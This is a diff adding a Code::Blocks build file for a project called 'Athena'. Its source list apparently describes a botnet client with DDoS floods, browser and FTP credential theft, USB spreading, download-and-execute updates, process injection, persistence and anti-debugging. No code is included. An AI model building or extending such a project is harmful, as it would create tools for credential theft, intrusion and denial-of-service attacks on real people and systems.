@@ -1,0 +1,152 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
+<CodeBlocks_project_file>
+	<FileVersion major="1" minor="6" />
+	<Project>
+		<Option title="Athena" />
+		<Option pch_mode="2" />
+		<Option compiler="gcc" />
+		<Build>
+			<Target title="Debug">
+				<Option output="bin/Debug/Athena" prefix_auto="1" extension_auto="1" />
+				<Option object_output="obj/Debug/" />
+				<Option type="1" />
+				<Option compiler="gcc" />
+				<Option use_console_runner="0" />
+				<Compiler>
+					<Add option="-fomit-frame-pointer" />
+					<Add option="-fexpensive-optimizations" />
+					<Add option="-Os" />
+					<Add option="-O3" />
+					<Add option="-O2" />
+					<Add option="-O1" />
+					<Add option="-O" />
+				</Compiler>
+				<Linker>
+					<Add option="-s" />
+					<Add library="C:\Program Files (x86)\CodeBlocks\MinGW\lib\libwininet.a" />
+					<Add library="C:\Program Files (x86)\CodeBlocks\MinGW\lib\libws2_32.a" />
+				</Linker>
+			</Target>
+			<Target title="Release">
+				<Option output="bin/Release/Athena" prefix_auto="1" extension_auto="1" />
+				<Option object_output="obj/Release/" />
+				<Option type="0" />
+				<Option compiler="gcc" />
+				<Compiler>
+					<Add option="-fomit-frame-pointer" />
+					<Add option="-fexpensive-optimizations" />
+					<Add option="-Os" />
+					<Add option="-O3" />
+					<Add option="-O2" />
+					<Add option="-O1" />
+					<Add option="-O" />
+				</Compiler>
+				<Linker>
+					<Add option="-s" />
+					<Add library="C:\Program Files (x86)\CodeBlocks\MinGW\lib\libwininet.a" />
+					<Add library="C:\Program Files (x86)\CodeBlocks\MinGW\lib\libws2_32.a" />
+				</Linker>
+			</Target>
+		</Build>
+		<Compiler>
+			<Add option="-fomit-frame-pointer" />
+			<Add option="-fexpensive-optimizations" />
+			<Add option="-Os" />
+			<Add option="-O3" />
+			<Add option="-O2" />
+			<Add option="-O1" />
+			<Add option="-O" />
+			<Add option="-w" />
+			<Add option="-fexceptions" />
+		</Compiler>
+		<Linker>
+			<Add option="-s" />
+			<Add library="C:\Program Files (x86)\CodeBlocks\MinGW\lib\libwininet.a" />
+			<Add library="C:\Program Files (x86)\CodeBlocks\MinGW\lib\libws2_32.a" />
+		</Linker>
+		<Unit filename="Source/DDoS/BandwithDrain.cpp" />
+		<Unit filename="Source/DDoS/DdosCommandHandler.cpp" />
+		<Unit filename="Source/DDoS/DdosEcf.cpp" />
+		<Unit filename="Source/DDoS/DdosMassBrowserLoads.cpp" />
+		<Unit filename="Source/DDoS/DdosRapidGetPostArme.cpp" />
+		<Unit filename="Source/DDoS/DdosSlowPost.cpp" />
+		<Unit filename="Source/DDoS/DdosSlowlorisRudy.cpp" />
+		<Unit filename="Source/DDoS/DdosUdp_.cpp" />
+		<Unit filename="Source/DDoS/NonBlockingDdosTimer.cpp" />
+		<Unit filename="Source/Encryption/Base64_.cpp" />
+		<Unit filename="Source/Encryption/MD5.cpp" />
+		<Unit filename="Source/Encryption/RC4.cpp" />
+		<Unit filename="Source/General/Botkiller.cpp" />
+		<Unit filename="Source/General/DlExecUpdate.cpp" />
+		<Unit filename="Source/General/FileSearchEngine.cpp" />
+		<Unit filename="Source/General/HostsFile.cpp" />
+		<Unit filename="Source/General/Injection.cpp" />
+		<Unit filename="Source/General/InstallAndPersistFileRegistry.cpp" />
+		<Unit filename="Source/General/LockComputer.cpp" />
+		<Unit filename="Source/General/MutexInstancesAndUsage.cpp" />
+		<Unit filename="Source/General/PacketSniff.cpp" />
+		<Unit filename="Source/General/SkypeMassMessenger.cpp" />
+		<Unit filename="Source/General/Socks4.cpp" />
+		<Unit filename="Source/General/UsbSpread.cpp" />
+		<Unit filename="Source/General/Visit.cpp" />
+		<Unit filename="Source/Hub/Connect.cpp" />
+		<Unit filename="Source/Hub/DecryptIp.cpp" />
+		<Unit filename="Source/Hub/HttpUtilities.cpp" />
+		<Unit filename="Source/Hub/IrcUtilities.cpp" />
+		<Unit filename="Source/Hub/Ssl.cpp" />
+		<Unit filename="Source/Includes/defines.h" />
+		<Unit filename="Source/Includes/includes.h" />
+		<Unit filename="Source/Includes/settings.h" />
+		<Unit filename="Source/IrcWar/AutonomousFloods.cpp" />
+		<Unit filename="Source/IrcWar/Generator.cpp" />
+		<Unit filename="Source/IrcWar/IrcWar.cpp" />
+		<Unit filename="Source/IrcWar/SendData.cpp" />
+		<Unit filename="Source/IrcWar/StartIrcWar.cpp" />
+		<Unit filename="Source/Other/BlockingTimer.cpp" />
+		<Unit filename="Source/Other/DynamicLinking.cpp" />
+		<Unit filename="Source/Other/DynamicLinking.h" />
+		<Unit filename="Source/Other/MD5.h" />
+		<Unit filename="Source/Other/Notes.txt" />
+		<Unit filename="Source/Other/Proactive.cpp" />
+		<Unit filename="Source/Other/ProcessArgs.cpp" />
+		<Unit filename="Source/Other/RestartExplorer.cpp" />
+		<Unit filename="Source/Other/VariableDeclarations.cpp" />
+		<Unit filename="Source/Protection/AntiDebugEmulate.cpp" />
+		<Unit filename="Source/Protection/ConfigSetup.cpp" />
+		<Unit filename="Source/Protection/ProcessPersistenceViaInjectedThreads.cpp" />
+		<Unit filename="Source/Protection/ProcessPersistenceViaSister.cpp" />
+		<Unit filename="Source/Protection/TaskManagerTricks.cpp" />
+		<Unit filename="Source/Protocol/Commands.cpp" />
+		<Unit filename="Source/Protocol/Communication.cpp" />
+		<Unit filename="Source/Recovery/RecoveryChrome.cpp" />
+		<Unit filename="Source/Recovery/RecoveryFirefox.cpp" />
+		<Unit filename="Source/Recovery/RecoveryFtp.cpp" />
+		<Unit filename="Source/Recovery/RecoveryIm.cpp" />
+		<Unit filename="Source/Utilities/ComputerInfo.cpp" />
+		<Unit filename="Source/Utilities/Dacl.cpp" />
+		<Unit filename="Source/Utilities/Files.cpp" />
+		<Unit filename="Source/Utilities/Ftp.cpp" />
+		<Unit filename="Source/Utilities/Http.cpp" />
+		<Unit filename="Source/Utilities/Misc.cpp" />
+		<Unit filename="Source/Utilities/Mutex.cpp" />
+		<Unit filename="Source/Utilities/ProcessStrings.cpp" />
+		<Unit filename="Source/Utilities/Process_.cpp" />
+		<Unit filename="Source/Utilities/Registry.cpp" />
+		<Unit filename="Source/Utilities/srandRelated.cpp" />
+		<Unit filename="Source/main.cpp" />
+		<Extensions>
+			<code_completion />
+			<debugger />
+			<envvars />
+			<DoxyBlocks>
+				<comment_style block="0" line="0" />
+				<doxyfile_project />
+				<doxyfile_build />
+				<doxyfile_warnings />
+				<doxyfile_output />
+				<doxyfile_dot />
+				<general />
+			</DoxyBlocks>
+		</Extensions>
+	</Project>
+</CodeBlocks_project_file>
